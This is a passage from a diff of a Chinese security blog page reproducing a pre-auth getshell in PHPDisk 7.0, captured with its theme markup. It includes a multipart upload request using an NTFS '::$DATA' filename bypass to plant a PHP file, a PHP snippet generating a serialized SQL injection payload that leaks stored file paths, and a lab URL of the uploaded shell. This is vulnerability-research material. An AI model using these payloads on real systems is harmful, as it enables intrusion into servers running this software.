+<span class="hljs-attribute">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span>
+<span class="hljs-attribute">Content-Disposition</span>: form-data; name="upload_file"; filename="shell.php::$DATA"
+<span class="hljs-attribute">Content-Type</span>: application/octet-stream
+
+&lt;?php
+
+<span class="hljs-attribute">phpinfo();</span>
+<span class="hljs-attribute"></span>
+<span class="hljs-attribute">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span>
+<span class="hljs-attribute">Content-Disposition</span>: form-data; name="Upload"
+
+Submit Query
+------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2--</code></pre>
+<p><img src="./5.png" srcset="/img/loading.gif" alt=""></p>
 <h2 id="sql注入获取文件名"><a href="#sql注入获取文件名" class="headerlink" title="sql注入获取文件名"></a>sql注入获取文件名</h2><p>viewfile.php?file_id=1可以显示文件信息,注入回显点为<strong><em>file_descripttion字段</em></strong>。前提是得到fike_id值,可以通过爆破获得。还有一种方法就是在插入payload时候将文件名设置为共享即in_share=1.</p>
 <p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a&#x3D;array(&quot;file_id&quot;&#x3D;&gt;&quot;1000&quot;,&quot;file_name&quot;&#x3D;&gt;&quot;od錦&#39;,&#96;in_share&#96;&#x3D;1,&#96;file_description&#96;&#x3D;(select x.a from (select concat(file_store_path,file_real_name)a from pd_files where file_extension&#x3D;0x7068703a3a2444415441)x)#&quot;);</span><br><span class="line">echo base64_encode(serialize($a));</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
+<span class="php">$a=<span class="hljs-keyword">array</span>(<span class="hljs-string">"file_id"</span>=&gt;<span class="hljs-string">"1000"</span>,<span class="hljs-string">"file_name"</span>=&gt;<span class="hljs-string">"od錦',`in_share`=1,`file_description`=(select x.a from (select concat(file_store_path,file_real_name)a from pd_files where file_extension=0x7068703a3a2444415441)x)#"</span>);</span>
+<span class="php"><span class="hljs-keyword">echo</span> base64_encode(serialize($a));</span></code></pre>
 
-<h2 id="curl传入data值"><a href="#curl传入data值" class="headerlink" title="curl传入data值"></a>curl传入data值</h2><p><img src="./6.png" alt=""></p>
-<p>从共享文件处找到<strong>od錦</strong>，可得回显的<strong>file_description字段</strong>，得到文件路径和文件名。<br><img src="./7.png" alt=""></p>
-<p>访问<a href="http://192.168.56.101/phpdisk_v7.0_gbk/upload/filestores/2019/07/09/4265f571116622aa7ca543ecb18f4f6a.php" target="_blank" rel="noopener">http://192.168.56.101/phpdisk_v7.0_gbk/upload/filestores/2019/07/09/4265f571116622aa7ca543ecb18f4f6a.php</a><br><img src="./8.png" alt=""></p>
+<h2 id="curl传入data值"><a href="#curl传入data值" class="headerlink" title="curl传入data值"></a>curl传入data值</h2><p><img src="./6.png" srcset="/img/loading.gif" alt=""></p>
+<p>从共享文件处找到<strong>od錦</strong>，可得回显的<strong>file_description字段</strong>，得到文件路径和文件名。<br><img src="./7.png" srcset="/img/loading.gif" alt=""></p>
+<p>访问<a href="http://192.168.56.101/phpdisk_v7.0_gbk/upload/filestores/2019/07/09/4265f571116622aa7ca543ecb18f4f6a.php" target="_blank" rel="noopener">http://192.168.56.101/phpdisk_v7.0_gbk/upload/filestores/2019/07/09/4265f571116622aa7ca543ecb18f4f6a.php</a><br><img src="./8.png" srcset="/img/loading.gif" alt=""></p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
 <li>程序代码如３０２跳转如果未正确exit导致越权</li>
 <li>phpstorm动态审计找到<strong>文件名判断或修改</strong>处进行溯源</li>
 <li><a href="https://xz.aliyun.com/t/2539" target="_blank" rel="noopener">https://xz.aliyun.com/t/2539</a> Windows下的NTFS ADS流</li>
 <li>身份判断一般出现在文件入口处，分析逻辑判断是否可以越权</li>
-<li>三种后台姿势<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">找到sql注入，注入出真实文件名</span><br><span class="line">删除index.htm，达成目录遍历</span><br><span class="line">使用Windows下的部分PHP函数的正则匹配（案例：DEDECMS寻找后台）</span><br></pre></td></tr></table></figure></li>
+<li>三种后台姿势<pre><code class="hljs pgsql">找到<span class="hljs-keyword">sql</span>注入，注入出真实文件名
+删除<span class="hljs-keyword">index</span>.htm，达成目录遍历
+使用Windows下的部分PHP函数的正则匹配（案例：DEDECMS寻找后台）</code></pre></li>
 <li>存在多版本是否查询是否存在编码转换操作不当，可能造成宽字节注入</li>
 <li>还有…别啃无用代码</li>
 </ol>
-</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">osword</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://zhzhdoai.github.io/2019/07/09/phpdisk%E5%89%8D%E5%8F%B0Getshell-%E5%A4%8D%E7%8E%B0/">http://zhzhdoai.github.io/2019/07/09/phpdisk%E5%89%8D%E5%8F%B0Getshell-%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://zhzhdoai.github.io" target="_blank">osword's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></div><div class="post_share"><div class="social-share" data-image="/img/404.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="post-qr-code__img" src="/img/wechat.jpg" alt="微信"/><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="post-qr-code__img" src="/img/alipay.jpg" alt="支付寶"/><div class="post-qr-code__desc">支付寶</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2019/07/10/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"><img class="prev_cover" src="/img/404.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">PHP文件上传漏洞总结</div></div></a></div><div class="next-post pull_right"><a href="/2019/07/08/Flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><img class="next_cover" src="/img/404.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Flask框架学习笔记</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2019/09/17/Cmsms-2-2-9前台sql注入-复现/" title="Cmsms_2.2.9前台sql注入(复现)"><img class="relatedPosts_cover" src="/img/404.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2019-09-17</div><div class="relatedPosts_title">Cmsms_2.2.9前台sql注入(复现)</div></div></a></div><div class="relatedPosts_item"><a href="/2019/03/08/Dedecms-cookie伪造导致任意前台用户登录/" title="Dedecms | cookie伪造导致任意前台用户登录"><img class="relatedPosts_cover" src="/img/404.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2019-03-08</div><div class="relatedPosts_title">Dedecms | cookie伪造导致任意前台用户登录</div></div></a></div><div class="relatedPosts_item"><a href="/2019/07/28/Dedecms后台getshell漏洞集合/" title="Dedecms后台getshell漏洞集合"><img class="relatedPosts_cover" src="/img/404.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2019-07-28</div><div class="relatedPosts_title">Dedecms后台getshell漏洞集合</div></div></a></div><div class="relatedPosts_item"><a href="/2019/12/15/Discuz-3-4后台基于文件内容的二次注入-1/" title="Discuz!<=3.4后台基于文件内容的二次注入"><img class="relatedPosts_cover" src="/img/404.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2019-12-15</div><div class="relatedPosts_title">Discuz!<=3.4后台基于文件内容的二次注入</div></div></a></div><div class="relatedPosts_item"><a href="/2019/07/12/DiscuzML-3-x-代码注入/" title="DiscuzML 3.x 代码注入"><img class="relatedPosts_cover" src="/img/404.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2019-07-12</div><div class="relatedPosts_title">DiscuzML 3.x 代码注入</div></div></a></div><div class="relatedPosts_item"><a href="/2019/04/25/HDwiki6-0-sql盲注/" title="HDwiki6.0_sql盲注"><img class="relatedPosts_cover" src="/img/404.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2019-04-25</div><div class="relatedPosts_title">HDwiki6.0_sql盲注</div></div></a></div></div><div class="clear_both"></div></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 By osword</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@3/instantpage.min.js" type="module"></script></body></html>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/07/10/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PHP文件上传漏洞总结</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/07/08/Flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                        <span class="hidden-mobile">Flask框架学习笔记</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "phpdisk前台Getshell(复现)&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
